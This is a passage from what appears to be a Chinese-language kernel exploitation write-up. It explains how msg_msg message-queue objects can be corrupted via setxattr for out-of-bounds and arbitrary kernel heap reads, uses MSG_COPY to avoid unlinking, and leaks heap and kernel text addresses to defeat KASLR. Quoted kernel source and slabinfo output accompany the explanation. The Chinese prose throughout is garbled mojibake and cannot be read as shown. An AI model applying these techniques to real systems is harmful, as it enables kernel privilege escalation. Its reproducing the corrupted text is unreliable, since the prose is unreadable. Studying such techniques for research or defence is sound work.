æ­¤è¿™æ¡è·¯æš‚æ—¶æ˜¯èµ°ä¸é€šçš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¦æ‰¾ä¸€ä¸ªä¸æ˜¯ç‰¹åˆ«å—åˆ†é…å¤§å°å½±å“çš„ç»“æ„ä½“</p><h3 id="Step-II-msg-msg-æœç´¢å†…å­˜å®Œæˆåœ°å€æ³„éœ²">Step.II msg_msg æœç´¢å†…å­˜å®Œæˆåœ°å€æ³„éœ²</h3><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ã€Œå†™çš„åŸè¯­ã€ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦å¯»æ‰¾ã€Œè¯»çš„åŸè¯­ã€ï¼Œåœ¨ Linux kernel ä¸­æœ‰ç€ä¸€ç»„ system V æ¶ˆæ¯é˜Ÿåˆ—ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼š</p><ul><li>msggetï¼šåˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—</li><li>msgsndï¼šå‘æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—å‘é€æ¶ˆæ¯</li><li>msgrcvï¼šä»æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—æ¥æ¥æ”¶æ¶ˆæ¯</li></ul><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºè¿™æ ·ä¸€ä¸ªç»“æ„ä½“ï¼Œå…¶è¡¨ç¤ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msq_queue structure for each present queue on the system */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span><br><span class="hljs-type">time64_t</span> q_stime;<span class="hljs-comment">/* last msgsnd time */</span><br><span class="hljs-type">time64_t</span> q_rtime;<span class="hljs-comment">/* last msgrcv time */</span><br><span class="hljs-type">time64_t</span> q_ctime;<span class="hljs-comment">/* last change time */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;<span class="hljs-comment">/* current number of bytes on queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;<span class="hljs-comment">/* number of messages in queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;<span class="hljs-comment">/* max number of bytes on queue */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span><span class="hljs-comment">/* pid of last msgsnd */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span><span class="hljs-comment">/* last receive pid */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>è€Œå½“æˆ‘ä»¬è°ƒç”¨ msgsnd ç³»ç»Ÿè°ƒç”¨åœ¨æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æŒ‡å®šå¤§å°çš„ message æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºè¿™æ ·ä¸€ä¸ªç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨å†…æ ¸å½“ä¸­è¿™ä¸¤ä¸ªç»“æ„ä½“å½¢æˆä¸€ä¸ªå¦‚ä¸‹ç»“æ„çš„å¾ªç¯åŒå‘é“¾è¡¨ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>è‹¥æ˜¯æ¶ˆæ¯é˜Ÿåˆ—ä¸­åªæœ‰ä¸€ä¸ªæ¶ˆæ¯åˆ™æ˜¯è¿™æ ·ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ·±å…¥ msg_msg çš„å†…éƒ¨ç»“æ„ï¼Œé˜…è¯» msgsnd æºç å¯çŸ¥ï¼Œå½“æˆ‘ä»¬åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€ä¸ª message æ—¶ï¼Œå…¶é¦–å…ˆä¼šè°ƒç”¨ <code>load_msg</code> å°†è¯¥ message æ‹·è´åˆ°å†…æ ¸ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgsnd</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">long</span> mtype, <span class="hljs-type">void</span> __user *mtext,</span><br><span class="hljs-params"><span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>DEFINE_WAKE_Q(wake_q);<br><br>ns = current-&gt;nsproxy-&gt;ipc_ns;<br><br><span class="hljs-keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="hljs-type">long</span>) msgsz &lt; <span class="hljs-number">0</span> || msqid &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (mtype &lt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>msg = load_msg(mtext, msgsz);<br>    <br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>è€Œ <code>load_msg()</code> æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>alloc_msg()</code> åˆ†é…æ‰€éœ€çš„ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">load_msg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><span class="hljs-type">int</span> err = -EFAULT;<br><span class="hljs-type">size_t</span> alen;<br><br>msg = alloc_msg(len);<br></code></pre></td></tr></table></figure><p>é˜…è¯» <code>alloc_msg()</code> æºç å¯ä»¥å‘ç°ï¼Œå…¶ä»¥ msg_msg ç»“æ„ä½“ä¸ºæ ¸å¿ƒç”Ÿæˆå¦‚ä¸‹ç»“æ„ï¼š</p><ul><li>å¯¹äºå¤§å°åœ¨ã€ä¸€ä¸ªé¡µé¢å†å‡æ‰ä½œä¸º header çš„ msg_msg çš„ sizeã€‘èŒƒå›´å†…çš„æ•°æ®è€Œè¨€ï¼Œå†…æ ¸ä»…ä¼šåˆ†é…ä¸€ä¸ª size + header size å¤§å°çš„ objectï¼ˆé€šè¿‡ kmallocï¼‰ï¼Œå…¶å‰ 0x30 å¤§å°çš„éƒ¨åˆ†å­˜æ”¾ msg_msg è¿™ä¸€ headerï¼Œå‰©ä½™éƒ¨åˆ†ç”¨ä»¥å­˜æ”¾ç”¨æˆ·æ•°æ®</li><li>å¯¹äºå¤§å°è¶…å‡ºã€ä¸€ä¸ªé¡µé¢å†å‡æ‰ä½œä¸º header çš„ msg_msg çš„ sizeã€‘èŒƒå›´çš„æ•°æ®è€Œè¨€ï¼Œå…¶ä¼šé¢å¤–ç”Ÿæˆ <code>msg_msgseg</code> ç»“æ„ä½“æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®ï¼Œé€šè¿‡ kmalloc åˆ†é…ï¼Œå¤§å°ä¸ºå‰©ä½™æœªæ‹·è´çš„ç”¨æˆ·æ•°æ®å¤§å°åŠ ä¸Š next æŒ‡é’ˆï¼›è¯¥ç»“æ„ä½“ä¸ msg_msg çš„ next æˆå‘˜å½¢æˆä¸€ä¸ª<strong>å•å‘é“¾è¡¨</strong>ï¼Œå…¶å‰ 8 å­—èŠ‚å­˜æ”¾æŒ‡å‘ä¸‹ä¸€ä¸ª msg_msgseg çš„æŒ‡é’ˆï¼Œè‹¥æ— åˆ™ä¸º NULL</li></ul><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†é…ä¸€ä¸ªå¤§å°ä¸º 1024 çš„ msg_msg ç»“æ„ä½“ä½œä¸º victimï¼Œåˆ©ç”¨ setxattr ç³»ç»Ÿè°ƒç”¨ä¿®æ”¹å…¶ header ä¸­çš„ <code>m_ts</code> æˆå‘˜ï¼Œ<strong>ä»è€Œå®ç°å †ä¸Šçš„è¶Šç•Œæ•°æ®è¯»å–</strong>ï¼ŒåŒæ—¶è¿˜èƒ½é€šè¿‡ä¿®æ”¹ msg_msg-&gt;next <strong>å®ç°ä»»æ„åœ°å€è¯»</strong></p><p>ä½†æ˜¯è¿™æ ·æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ msgrcv æ¥å—æ¶ˆæ¯æ—¶ï¼Œå…¶ä¼šè°ƒç”¨ <code>list_del()</code> å°†å¯¹åº”çš„ msg_msg ç»“æ„ä½“ä»åŒå‘é“¾è¡¨ä¸­ unlinkï¼Œ<strong>æ­¤æ—¶æˆ‘ä»¬å¹¶ä¸çŸ¥é“å†…æ ¸ç©ºé—´ä¸­çš„ä»»ä½•åœ°å€ï¼Œå› æ­¤å†…æ ¸ä¼šåœ¨ unlink æ—¶ panic æ‰</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg,</span><br><span class="hljs-params">       <span class="hljs-type">long</span> (*msg_handler)(<span class="hljs-type">void</span> __user *, <span class="hljs-keyword">struct</span> msg_msg *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    list_del(&amp;msg-&gt;m_list);<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">goto</span> out_unlock0;<br><span class="hljs-comment">//...</span><br>out_unlock0:<br>ipc_unlock_object(&amp;msq-&gt;q_perm);<br>wake_up_q(&amp;wake_q);<br>out_unlock1:<br>rcu_read_unlock();<br><span class="hljs-keyword">if</span> (IS_ERR(msg)) &#123;<br>free_copy(copy);<br><span class="hljs-keyword">return</span> PTR_ERR(msg);<br>&#125;<br><br>bufsz = msg_handler(buf, msg, bufsz);<br>free_msg(msg);<br><br><span class="hljs-keyword">return</span> bufsz;<br>&#125;<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦æƒ³ä¸€ä¸ªæ–¹æ³•æ—¢èƒ½è¯»å‡º msg_msg ä¸­æ•°æ®åˆä¸ä¼šè®©å…¶è¢«éæ³• unlink æ‰ï¼Œé˜…è¯»æºç æˆ‘ä»¬ä¼šå‘ç°ï¼Œå½“æˆ‘ä»¬åœ¨è°ƒç”¨ msgrcv æ—¶è‹¥è®¾ç½®äº† <code>MSG_COPY</code> æ ‡å¿—ä½ï¼Œåˆ™<strong>å†…æ ¸ä¼šå°† message æ‹·è´ä¸€ä»½åå†æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼ŒåŸåŒå‘é“¾è¡¨ä¸­çš„ message å¹¶ä¸ä¼šè¢« unlink</strong>ï¼Œä»è€Œæˆ‘ä»¬ä¾¿å¯ä»¥å¤šæ¬¡é‡å¤åœ°è¯»å–åŒä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ä¸­æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br><span class="hljs-keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))<br><span class="hljs-keyword">return</span> -EINVAL;<br>copy = prepare_copy(buf, <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));<br><span class="hljs-keyword">if</span> (IS_ERR(copy))<br><span class="hljs-keyword">return</span> PTR_ERR(copy);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we are copying, then do not unlink message and do</span><br><span class="hljs-comment"> * not update queue parameters.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br>msg = copy_msg(msg, copy);<br><span class="hljs-keyword">goto</span> out_unlock0;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘è¶Šç•Œè¯»å–çš„è¯¦ç»†è¿‡ç¨‹ï¼Œæˆ‘ä»¬é¦–å…ˆå¯ä»¥åˆ©ç”¨ setxattr ä¿®æ”¹ msg_msg çš„ <code>next</code> æŒ‡é’ˆä¸º NULLã€å°†å…¶ <code>m_ts</code> æ”¹ä¸º <code>0x1000 - 0x30</code>ï¼ˆåœ¨ next æŒ‡é’ˆä¸º NULL çš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ª msg_msg ç»“æ„ä½“æœ€å¤§å ç”¨ä¸€å¼ å†…å­˜é¡µçš„å¤§å°ï¼‰ï¼Œä»è€Œè¶Šç•Œè¯»å‡ºå†…æ ¸å †ä¸Šæ•°æ®</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ€è€ƒå¦‚ä½•è¿›è¡Œâ€œåˆæ³•â€çš„æœç´¢ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ <code>copy_msg</code> çš„é€»è¾‘ï¼Œå…¶æ‹·è´æ—¶åˆ¤æ–­å¾…æ•°æ®é•¿åº¦çš„é€»è¾‘<strong>ä¸»è¦æ˜¯çœ‹ next æŒ‡é’ˆ</strong>ï¼Œå› æ­¤è‹¥æˆ‘ä»¬çš„ next æŒ‡é’ˆä¸ºä¸€ä¸ªéæ³•åœ°å€ï¼Œåˆ™ä¼šåœ¨è§£å¼•ç”¨æ—¶å¯¼è‡´ kernel panic</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">copy_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *src, <span class="hljs-keyword">struct</span> msg_msg *dst)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">dst_pseg</span>, *<span class="hljs-title">src_pseg</span>;</span><br><span class="hljs-type">size_t</span> len = src-&gt;m_ts;<br><span class="hljs-type">size_t</span> alen;<br><br><span class="hljs-keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><br>alen = min(len, DATALEN_MSG);<br><span class="hljs-built_in">memcpy</span>(dst + <span class="hljs-number">1</span>, src + <span class="hljs-number">1</span>, alen);<br><br><span class="hljs-keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;<br>     src_pseg != <span class="hljs-literal">NULL</span>;<br>     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;<br><br>len -= alen;<br>alen = min(len, DATALEN_SEG);<br><span class="hljs-built_in">memcpy</span>(dst_pseg + <span class="hljs-number">1</span>, src_pseg + <span class="hljs-number">1</span>, alen);<br>&#125;<br><br>dst-&gt;m_type = src-&gt;m_type;<br>dst-&gt;m_ts = src-&gt;m_ts;<br><br><span class="hljs-keyword">return</span> dst;<br>&#125;<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦ç¡®ä¿<strong>è·å¾—ä¸€ä¸ªåˆæ³•çš„å †ä¸Šåœ°å€è¿›è¡Œæœç´¢çš„åŒæ—¶</strong>ç¡®ä¿æˆ‘ä»¬æ‰€æ„é€ çš„<strong>next é“¾ä¸Šçš†ä¸ºåˆæ³•åœ°å€ï¼Œå¹¶ä»¥ NULL ç»“å°¾</strong>ï¼Œå¦‚ä½•æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªåœ°å€ï¼Ÿ</p><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œslub ä¼šå‘ buddy system ç”³è¯·ä¸€å¼ æˆ–å¤šå¼ è¿ç»­å†…å­˜é¡µï¼Œå°†å…¶åˆ†å‰²ä¸ºæŒ‡å®šå¤§å°çš„ object ä¹‹åå†è¿”è¿˜ç»™ kmalloc çš„ callerï¼Œå¯¹äºå¤§å°ä¸º 1024 çš„ objectï¼Œå…¶æ¯æ¬¡ç”³è¯·çš„è¿ç»­å†…å­˜é¡µä¸ºå››å¼ ï¼Œåˆ†ä¸º 16 ä¸ª object</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/sla</span> <br>Password: <br>slabinfo - version: 2.1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;<span class="hljs-built_in">limit</span>&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br>kmalloc-1k          3341   3584   1024   16    4 : tunables    0    0    0 : slabdata    224    224      0<br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œè‹¥æ˜¯æˆ‘ä»¬<strong>åˆ†é…å¤šä¸ªå¤§å°åŒä¸º 1024 çš„ msg_msg ç»“æ„ä½“ï¼Œåˆ™å…¶å¾ˆå®¹æ˜“è½åœ¨åœ°å€è¿ç»­çš„ 4 å¼ å†…å­˜é¡µä¸Š</strong>ï¼Œæ­¤æ—¶è‹¥æ˜¯æˆ‘ä»¬ä»å…¶ä¸­ä¸€ä¸ª msg_msg ç»“æ„ä½“å‘åè¿›è¡Œè¶Šç•Œè¯»ï¼Œ<strong>åˆ™å¾ˆå®¹æ˜“è¯»å–åˆ°å…¶ä»–çš„ msg_msg ç»“æ„ä½“çš„æ•°æ®</strong>ï¼Œå…¶ m_list æˆå‘˜å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ³„éœ²å‡ºä¸€ä¸ªå †ä¸Šåœ°å€</p><p>é‚£ä¹ˆè¿™ä¸ªå †ä¸Šåœ°å€æŒ‡å‘å“ªå‘¢ï¼Ÿè®©æˆ‘ä»¬å°†ç›®å…‰é‡æ–°æ”¾å› <code>msg_queue</code> ä¸ <code>msg_msg</code> ç»“æ„ä½“ä¹‹é—´çš„å…³ç³»ï¼Œå½“ä¸€ä¸ªæ¶ˆæ¯ä¸Šåªæœ‰ä¸€ä¸ª message æ—¶ï¼Œæˆ‘ä»¬ä¸éš¾çœ‹å‡º msg_msg çš„ prev ä¸ next æŒ‡é’ˆéƒ½æŒ‡å‘ msg_queue çš„ <code>q_messages</code> åŸŸï¼Œå¯¹åº”åœ°ï¼Œ msg_queue-&gt;q_message çš„ prev ä¸ next ä¹ŸåŒæ ·æŒ‡å‘ msg_msg çš„ <code>m_list</code> åŸŸ</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>æ­¤æ—¶æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥å°† msg_msg çš„ next æŒ‡é’ˆæŒ‡å› msg_queueï¼Œä»è€Œè¯»å‡ºä¸Šé¢çš„æŒ‡å‘ msg_msg çš„æŒ‡é’ˆï¼Œå°†æœªçŸ¥çš„åœ°å€å˜ä¸ºå·²çŸ¥çš„åœ°å€</strong>ï¼Œä¹‹åæˆ‘ä»¬åœ¨æœç´¢æ—¶ä¾¿å¯ä»¥é€‰æ‹©ä»è¯¥åœ°å€å¼€å§‹æœç´¢ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½çŸ¥é“æ¯æ¬¡æœç´¢æ—¶è·å¾—çš„æ¯ä¸€æ¡æ•°æ®çš„åœ°å€ï¼Œ<strong>ä»è€Œåœ¨æ¯æ¬¡æœç´¢æ—¶èƒ½å¤ŸæŒ‘é€‰å·²çŸ¥æ•°æ®ä¸º NULL çš„åŒºåŸŸä½œä¸º next-&gt;next ä»¥é¿å… kernel panic</strong>ï¼Œä»¥æ­¤è·å¾—è¿ç»­çš„æœç´¢å†…å­˜çš„èƒ½åŠ›</p><p>ä½†æ˜¯è¿™æœ‰ä¸€ä¸ªå°è¦æ±‚ï¼Œæˆ‘ä»¬åœ¨æ³„éœ² msg_msg åœ°å€æ—¶åº”å½“é€‰å– msg_queue-&gt;q_message å¾€å‰çš„ä¸€å—ä¸º NULL çš„åŒºåŸŸä½œä¸º msg_msg-&gt;nextï¼Œä¸è¿‡ä»¤ç¬”è€…æ¬£å–œçš„æ˜¯ï¼Œ<code>msg_queue-&gt;q_lrpid</code> åœ¨æœªä½¿ç”¨ msgrcv æ¥æ”¶æ¶ˆæ¯æ—¶<strong>ä¸º NULL</strong>ï¼Œè¯¥æˆå‘˜åœ¨ q_message æˆå‘˜å‘å‰çš„ 8 å­—èŠ‚å¤„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°† next æŒ‡é’ˆæŒ‡å‘è¿™ä¸ªä½ç½®</p><p><img src="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png" alt="image.png"></p><p>æ³„éœ²å‡º msg_msg çš„åœ°å€ä¹‹åå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„å†…å­˜æœç´¢äº†ï¼Œè‡³äºåœ¨æ³„éœ²å‡ºå†…æ ¸ä»£ç æ®µä¸ŠæŒ‡é’ˆåå¦‚ä½•è®¡ç®—å‡ºå†…æ ¸ä»£ç æ®µåŸºå€ï¼Œç¬”è€…è¿™é‡Œçš„åšæ³•æ¯”è¾ƒç¬¨ï¼šå°†ç»å¸¸å‡ºç°çš„å†…æ ¸æŒ‡é’ˆåšæˆä¸€ä¸ªå­—å…¸ï¼Œä¹‹åç›´æ¥ query å³å¯ï¼Œè‹¥å­—å…¸æœªå‘½ä¸­åˆ™ç»§ç»­æœç´¢</p><blockquote><p>å¯èƒ½æœ‰çš„äººä¼šæƒ³åˆ°ä¸€ä¸ªæ›´ä¸ºå¿«æ·çš„åŠæ³•ï¼šå› ä¸ºæˆ‘ä»¬å·²ç»è·å¾—äº†å†…æ ¸çš„â€œå †ä¸Šåœ°å€â€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»çŒœæµ‹â€œå †çš„åŸºå€â€ï¼ˆ<code>page_offset_base</code>ï¼‰ï¼Œåœ¨ <code>page_offset_base + 0x9d000</code> å¤„<strong>å›ºå®šå­˜æ”¾ç€</strong> <code>secondary_startup_64</code> å‡½æ•°çš„åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€å‰é¢åˆšå¥½æœ‰ä¸€ç‰‡ä¸º 0 çš„åŒºåŸŸæ–¹ä¾¿æˆ‘ä»¬çš„ next æŒ‡é’ˆè¿›è¡ŒæŒ‡å‘</p><p>ä½†è¿™ä¸ªåšæ³•æœ‰ä¸€å®šçš„é£é™©ï¼šè‹¥æ˜¯æˆ‘ä»¬çŒœé”™äº†åˆ™å¾ˆå®¹æ˜“å¯¼è‡´ kernel panicï¼Œä¸”ç»ç¬”è€…å°è¯•ä¼šåœ¨æˆ‘ä»¬çš„ä¸‹ä¸€æ­¥ä¸­<strong>å¯¼è‡´ kernel panic</strong>ï¼ˆä¹Ÿå¯èƒ½æ˜¯ç¬”è€…çš„æ„é€ å­˜åœ¨ç¼ºé™·ï¼‰ï¼Œæ‰€ä»¥ç¬”è€…è¿˜æ˜¯æ›´æ¨èå¤§å®¶åªç”¨å†…å­˜æœç´¢çš„åŠæ³•</p></blockquote><h3 id="Step-III-æ„é€ -A-B-A-å¼-freelist-åŠ«æŒæ–°çš„ç»“æ„ä½“">Step.III æ„é€  